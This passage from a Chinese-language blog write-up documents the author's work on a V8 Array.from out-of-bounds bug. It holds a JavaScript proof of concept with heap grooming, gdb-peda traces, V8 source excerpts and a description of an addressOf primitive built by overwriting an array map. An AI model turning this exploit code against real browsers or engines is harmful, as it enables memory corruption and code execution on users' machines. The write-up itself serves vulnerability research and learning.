class="line">--More--(25/100)q</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x2f429437d080</span><br><span class="line"><span class="variable">$1</span> = 3</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x2f429437d088</span><br><span class="line"><span class="variable">$2</span> = 4</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>修改一下gc的位置查看内存布局</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ((<span class="number">1024</span>*<span class="number">516</span>));i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"a"</span>:<span class="string">"1"</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">3.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    max : <span class="number">1000</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter == <span class="keyword">this</span>.max) &#123;</span><br><span class="line">        oobArray.length = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> double_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [a];</span><br><span class="line"></span><br><span class="line"><span class="comment">//oobArray[oobArray.length - 1] = 0x41414141;</span></span><br></pre></td></tr></table></figure>
<p>可以看到现在<code>oobArray</code>的obj已经在<code>elements-736</code>的位置，比较接近了，但是elements依然不能越界读写到自己的这个obj，因此我们再次修改gc位置，在每个对象定义前都加gc，最终可以使得elements越界读写到后面布置的<code>double_arr</code>和<code>obj_arr</code>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">3.1</span>];</span><br><span class="line"><span class="comment">//poc function</span></span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> double_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>];</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> obj_arr = [a];</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0xe7cd6b8c5a9: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x3821bae02679 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1f2870785539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0xe7cd6b8c889 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 999</span><br><span class="line"> - properties: 0x3a82be202251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3a82be24ff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0xe7cd6b8c889 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0</span><br><span class="line"> &#125;</span><br><span class="line">0x3821bae02679: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3821bae02621 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3a82be202629 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x1f28707857e9 &lt;DescriptorArray[5]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x1f2870785729 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3a82be24f7d9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3821bae026d1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x1f2870785539 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x1f2870785179 &lt;JSFunction Array (sfi = 0x3a82be23a641)&gt;</span><br><span class="line"> - dependent code: 0x3a82be202251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">gdb-peda$ distance 0xe7cd6b8c5a9 0xe7cd6b8c889</span><br><span class="line">From 0xe7cd6b8c5a9 to 0xe7cd6b8c889: 736 bytes, 184 dwords</span><br></pre></td></tr></table></figure>
<p>越界读发现异常，我们根据报错在<code>./../src/objects/fixed-array-inl.h:167</code>下源码断点调试，发现<code>index &gt;= 0 &amp;&amp; index &lt; this-&gt;length()</code>检查没过，后面跟下gdb发现这里的length是<code>map+0x7</code>即elements存储的length而非obj的length字段，这个字段为我们迭代器返回时设置的值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">FixedDoubleArray::get_representation</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  DCHECK(<span class="built_in">map</span>() != GetHeap()-&gt;fixed_cow_array_map() &amp;&amp;</span><br><span class="line">         <span class="built_in">map</span>() != GetHeap()-&gt;fixed_array_map());</span><br><span class="line">  DCHECK(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="keyword">this</span>-&gt;length());</span><br><span class="line">  <span class="keyword">int</span> offset = kHeaderSize + index * kDoubleSize;</span><br><span class="line">  <span class="keyword">return</span> READ_UINT64_FIELD(<span class="keyword">this</span>, offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20i <span class="variable">$pc</span></span><br><span class="line">=&gt; 0x55580e4340d4 &lt;v8::internal::FixedArrayBase::length() const+20&gt;:	jmp    0x55580e4340d9 &lt;v8::internal::FixedArrayBase::length() const+25&gt;</span><br><span class="line">   0x55580e4340d9 &lt;v8::internal::FixedArrayBase::length() const+25&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x55580e4340dd &lt;v8::internal::FixedArrayBase::length() const+29&gt;:	mov    rcx,QWORD PTR [rax+0x7]</span><br><span class="line">   0x55580e4340e1 &lt;v8::internal::FixedArrayBase::length() const+33&gt;:	mov    QWORD PTR [rbp-0x10],rcx</span><br><span class="line">   0x55580e4340e5 &lt;v8::internal::FixedArrayBase::length() const+37&gt;:	mov    rdi,QWORD PTR [rbp-0x10]</span><br><span class="line">   0x55580e4340e9 &lt;v8::internal::FixedArrayBase::length() const+41&gt;:	call   0x55580e436e20 &lt;v8::internal::Smi::ToInt(v8::internal::Object const*)&gt;</span><br><span class="line">   0x55580e4340ee &lt;v8::internal::FixedArrayBase::length() const+46&gt;:	add    rsp,0x20</span><br><span class="line">   0x55580e4340f2 &lt;v8::internal::FixedArrayBase::length() const+50&gt;:	pop    rbp</span><br><span class="line">   0x55580e4340f3 &lt;v8::internal::FixedArrayBase::length() const+51&gt;:	ret    </span><br><span class="line">   0x55580e4340f4:	int3   </span><br><span class="line">   0x55580e4340f5:	int3   </span><br><span class="line">   0x55580e4340f6:	int3   </span><br><span class="line">   0x55580e4340f7:	int3   </span><br><span class="line">   0x55580e4340f8:	int3   </span><br><span class="line">   0x55580e4340f9:	int3   </span><br><span class="line">   0x55580e4340fa:	int3   </span><br><span class="line">   0x55580e4340fb:	int3   </span><br><span class="line">   0x55580e4340fc:	int3   </span><br><span class="line">   0x55580e4340fd:	int3   </span><br><span class="line">   0x55580e4340fe:	int3   </span><br><span class="line">gdb-peda$ </span><br><span class="line">RAX: 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">RBX: 0x7f3b86a9ecc0 (&lt;v8::internal::Runtime_KeyedStoreIC_Miss(int, v8::internal::Object**, v8::internal::Isolate*)&gt;:	push   rbp)</span><br><span class="line">RCX: 0x100000000 </span><br><span class="line">RDX: 0x10f81a88c900 --&gt; 0x10f81a88c921 --&gt; 0x3401ecccccccccc </span><br><span class="line">RSI: 0x7ffdbcc77998 --&gt; 0x17b3c8902361 --&gt; 0x17b3c89022 </span><br><span class="line">RDI: 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">RBP: 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 --&gt; 0x7ffdbcc77de0 (--&gt; ...)</span><br><span class="line">RSP: 0x7ffdbcc779a0 --&gt; 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 (--&gt; ...)</span><br><span class="line">RIP: 0x55580e4340e1 (&lt;v8::internal::FixedArrayBase::length() const+33&gt;:	mov    QWORD PTR [rbp-0x10],rcx)</span><br><span class="line">R8 : 0x1 </span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x7f3b853eed88 (:__1::ctype&lt;char&gt;::id&gt;:	0xffffffffffffffff)</span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x122faf203eb1 --&gt; 0x17b3c8902d </span><br><span class="line">R13: 0x55580e97f8f8 --&gt; 0x17b3c89027d9 --&gt; 0x17b3c89022 </span><br><span class="line">R14: 0x5 </span><br><span class="line">R15: 0x7ffdbcc79748 --&gt; 0x122faf227679 --&gt; 0xcd000017b3c89025</span><br><span class="line">EFLAGS: 0x206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55580e4340d4 &lt;v8::internal::FixedArrayBase::length() const+20&gt;:	jmp    0x55580e4340d9 &lt;v8::internal::FixedArrayBase::length() const+25&gt;</span><br><span class="line">   0x55580e4340d9 &lt;v8::internal::FixedArrayBase::length() const+25&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x55580e4340dd &lt;v8::internal::FixedArrayBase::length() const+29&gt;:	mov    rcx,QWORD PTR [rax+0x7]</span><br><span class="line">=&gt; 0x55580e4340e1 &lt;v8::internal::FixedArrayBase::length() const+33&gt;:	mov    QWORD PTR [rbp-0x10],rcx</span><br><span class="line">   0x55580e4340e5 &lt;v8::internal::FixedArrayBase::length() const+37&gt;:	mov    rdi,QWORD PTR [rbp-0x10]</span><br><span class="line">   0x55580e4340e9 &lt;v8::internal::FixedArrayBase::length() const+41&gt;:	call   0x55580e436e20 &lt;v8::internal::Smi::ToInt(v8::internal::Object const*)&gt;</span><br><span class="line">   0x55580e4340ee &lt;v8::internal::FixedArrayBase::length() const+46&gt;:	add    rsp,0x20</span><br><span class="line">   0x55580e4340f2 &lt;v8::internal::FixedArrayBase::length() const+50&gt;:	pop    rbp</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffdbcc779a0 --&gt; 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 (--&gt; ...)</span><br><span class="line">0008| 0x7ffdbcc779a8 --&gt; 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">0016| 0x7ffdbcc779b0 --&gt; 0x55580e97f850 --&gt; 0x0 </span><br><span class="line">0024| 0x7ffdbcc779b8 --&gt; 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">0032| 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 --&gt; 0x7ffdbcc77de0 (--&gt; ...)</span><br><span class="line">0040| 0x7ffdbcc779c8 --&gt; 0x7f3b86238f25 (&lt;v8::internal::FixedDoubleArray::get_representation(int)+213&gt;:	mov    edx,DWORD PTR [rbp-0x38])</span><br><span class="line">0048| 0x7ffdbcc779d0 --&gt; 0x7f3b850ee4a0 --&gt; 0x0 </span><br><span class="line">0056| 0x7ffdbcc779d8 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055580e4340e1	32	SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line">gdb-peda$ </span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x1 </span><br><span class="line">RBX: 0x7f3b86a9ecc0 (&lt;v8::internal::Runtime_KeyedStoreIC_Miss(int, v8::internal::Object**, v8::internal::Isolate*)&gt;:	push   rbp)</span><br><span class="line">RCX: 0x20 (<span class="string">' '</span>)</span><br><span class="line">RDX: 0x10f81a88c900 --&gt; 0x10f81a88c921 --&gt; 0x3401ecccccccccc </span><br><span class="line">RSI: 0x7ffdbcc77998 --&gt; 0x55580e4340ee (&lt;v8::internal::FixedArrayBase::length() const+46&gt;:	add    rsp,0x20)</span><br><span class="line">RDI: 0x1 </span><br><span class="line">RBP: 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 --&gt; 0x7ffdbcc77de0 (--&gt; ...)</span><br><span class="line">RSP: 0x7ffdbcc779a0 --&gt; 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 (--&gt; ...)</span><br><span class="line">RIP: 0x55580e4340ee (&lt;v8::internal::FixedArrayBase::length() const+46&gt;:	add    rsp,0x20)</span><br><span class="line">R8 : 0x1 </span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x7f3b853eed88 (:__1::ctype&lt;char&gt;::id&gt;:	0xffffffffffffffff)</span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x122faf203eb1 --&gt; 0x17b3c8902d </span><br><span class="line">R13: 0x55580e97f8f8 --&gt; 0x17b3c89027d9 --&gt; 0x17b3c89022 </span><br><span class="line">R14: 0x5 </span><br><span class="line">R15: 0x7ffdbcc79748 --&gt; 0x122faf227679 --&gt; 0xcd000017b3c89025</span><br><span class="line">EFLAGS: 0x206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55580e4340e1 &lt;v8::internal::FixedArrayBase::length() const+33&gt;:	mov    QWORD PTR [rbp-0x10],rcx</span><br><span class="line">   0x55580e4340e5 &lt;v8::internal::FixedArrayBase::length() const+37&gt;:	mov    rdi,QWORD PTR [rbp-0x10]</span><br><span class="line">   0x55580e4340e9 &lt;v8::internal::FixedArrayBase::length() const+41&gt;:	call   0x55580e436e20 &lt;v8::internal::Smi::ToInt(v8::internal::Object const*)&gt;</span><br><span class="line">=&gt; 0x55580e4340ee &lt;v8::internal::FixedArrayBase::length() const+46&gt;:	add    rsp,0x20</span><br><span class="line">   0x55580e4340f2 &lt;v8::internal::FixedArrayBase::length() const+50&gt;:	pop    rbp</span><br><span class="line">   0x55580e4340f3 &lt;v8::internal::FixedArrayBase::length() const+51&gt;:	ret    </span><br><span class="line">   0x55580e4340f4:	int3   </span><br><span class="line">   0x55580e4340f5:	int3</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffdbcc779a0 --&gt; 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 (--&gt; ...)</span><br><span class="line">0008| 0x7ffdbcc779a8 --&gt; 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">0016| 0x7ffdbcc779b0 --&gt; 0x100000000 </span><br><span class="line">0024| 0x7ffdbcc779b8 --&gt; 0x10f81a88c909 --&gt; 0x17b3c89032 </span><br><span class="line">0032| 0x7ffdbcc779c0 --&gt; 0x7ffdbcc77a10 --&gt; 0x7ffdbcc77a30 --&gt; 0x7ffdbcc77a50 --&gt; 0x7ffdbcc77a80 --&gt; 0x7ffdbcc77de0 (--&gt; ...)</span><br><span class="line">0040| 0x7ffdbcc779c8 --&gt; 0x7f3b86238f25 (&lt;v8::internal::FixedDoubleArray::get_representation(int)+213&gt;:	mov    edx,DWORD PTR [rbp-0x38])</span><br><span class="line">0048| 0x7ffdbcc779d0 --&gt; 0x7f3b850ee4a0 --&gt; 0x0 </span><br><span class="line">0056| 0x7ffdbcc779d8 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055580e4340ee	32	SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>走到这里卡住，尝试了其他几种类型的<code>FixedArray</code>也不好使，看backtrace基本都是length的检查绕不过去，到这里刚好和<code>keenan</code>去吃饭，中间请教了一下<code>obj-&gt;length</code>和<code>elements-&gt;length</code>的关系，keenan讲说前者更为重要，而后者在<code>FixedArray</code>用的比较多，想以前者作为标准进行寻址最好是用<code>JSArray</code>。我们来看下<code>js-array.h</code>。可以看到array可以分成两种mode，fast mode/dictonary mode。我们想绕过elements的检查，因此尝试一下dictory mode的JSArray</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The JSArray describes JavaScript Arrays</span></span><br><span class="line"><span class="comment">//  Such an array can be in one of two modes:</span></span><br><span class="line"><span class="comment">//    - fast, backing storage is a FixedArray and length &lt;= elements.length();</span></span><br><span class="line"><span class="comment">//       Please note: push and pop can be used to grow and shrink the array.</span></span><br><span class="line"><span class="comment">//    - slow, backing storage is a HashTable with numbers as keys.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSArray</span> :</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line">  <span class="comment">//..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>objects.cc</code>中找到转换的函数<code>ShouldConvertToSlowElements</code>,调用函数<code>AddDataElement</code>猜测是向array中增加新的数据。当<code>(index-capacity)&gt;=1024</code>时降级，或者fast mode占用的内存原大于dictory占用的内存时也会降级。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Maximal gap that can be introduced by adding an element beyond</span></span><br><span class="line">  <span class="comment">// the current elements length.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> kMaxGap = <span class="number">1024</span>;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// JSObjects prefer dictionary elements if the dictionary saves this much</span></span><br><span class="line">  <span class="comment">// memory compared to a fast elements backing store.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> kPreferFastElementsSizeFactor = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kEntrySize = <span class="number">3</span>;<span class="comment">//或者1、2</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">ShouldConvertToSlowElements</span><span class="params">(JSObject* object, <span class="keyword">uint32_t</span> capacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span> index,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span>* new_capacity)</span> </span>&#123;</span><br><span class="line">  STATIC_ASSERT(JSObject::kMaxUncheckedOldFastElementsLength &lt;=</span><br><span class="line">                JSObject::kMaxUncheckedFastElementsLength);</span><br><span class="line">  <span class="keyword">if</span> (index &lt; capacity) &#123;</span><br><span class="line">    *new_capacity = capacity;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (index - capacity &gt;= JSObject::kMaxGap) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  *new_capacity = JSObject::NewElementsCapacity(index + <span class="number">1</span>);</span><br><span class="line">  DCHECK_LT(index, *new_capacity);</span><br><span class="line">  <span class="keyword">if</span> (*new_capacity &lt;= JSObject::kMaxUncheckedOldFastElementsLength ||</span><br><span class="line">      (*new_capacity &lt;= JSObject::kMaxUncheckedFastElementsLength &amp;&amp;</span><br><span class="line">       object-&gt;GetHeap()-&gt;InNewSpace(object))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If the fast-case backing storage takes up much more memory than a</span></span><br><span class="line">  <span class="comment">// dictionary backing storage would, the object should have slow elements.</span></span><br><span class="line">  <span class="keyword">int</span> used_elements = object-&gt;GetFastElementsUsage();</span><br><span class="line">  <span class="keyword">uint32_t</span> size_threshold = NumberDictionary::kPreferFastElementsSizeFactor *</span><br><span class="line">                            NumberDictionary::ComputeCapacity(used_elements) *</span><br><span class="line">                            NumberDictionary::kEntrySize;</span><br><span class="line">  <span class="keyword">return</span> size_threshold &lt;= *new_capacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过一番折腾调试，我发现我的问题在于报错的地方是<code>DCHECK</code>而不是<code>CHECK</code>，所谓的DCHECK就是debug版本的check，release版本中是没有的= =。。反应过来之后我决定还是拿之前的PoC试一下。调试数字经济的题目时有类似的痛苦，就是release版本用不了job，只能release和debug对照着看。我们先在release的文件夹下面创建一个debug文件夹poc.js的软链接方便同步exp<code>ln -s ../x64.debug/poc.js ./poc.js</code>，然后拿最早的越界poc尝试发现成功输出了。我想了下是不是可以直接patch掉debug里的DCHECK再编译呢(理论上应该可行，又去请教了柯南，我这个版本的v8可以通过修改args.gn<code>symbol_level=2</code>启用源码调试:)),那我们再重新编译一下d8(:(这个方法还是不行))。还是老老实实对着调吧- . -</p>
<p>趁着编译查查<code>args.gn</code>是做什么滴。gn是个编译系统，参考<a href="https://v8.dev/docs/build-gn" target="_blank" rel="noopener">build-gn</a>了解编译的方法，上面列举了常见的参数，存储参数的配置文件就在<code>args.gn</code>。也可以在<a href="https://gn.googlesource.com/gn/+/master/docs/reference.md" target="_blank" rel="noopener">GN Reference</a>深入了解。</p>
<h5 id="addressOf原语"><a href="#addressOf原语" class="headerlink" title="addressOf原语"></a>addressOf原语</h5><p>编写addressOf原语的思路和之前OOB题目比较类似，我们的目标是使用此原语得到对象的地址。先越界读<code>arr_map</code>和<code>double_map</code>。我们首先用<code>obj_arr[0] = obj</code>将目标对象保存到对象arr中，之后越界写<code>obj_arr-&gt;map=double_arr_map</code>将对象数组改为浮点数数组的类型，此时输出<code>obj_arr[0]</code>即为对象的地址。注意因为我们每次都要复用<code>obj_arr</code>，再将对象地址拷贝到临时变量后我们需要将map修改回去。</p>
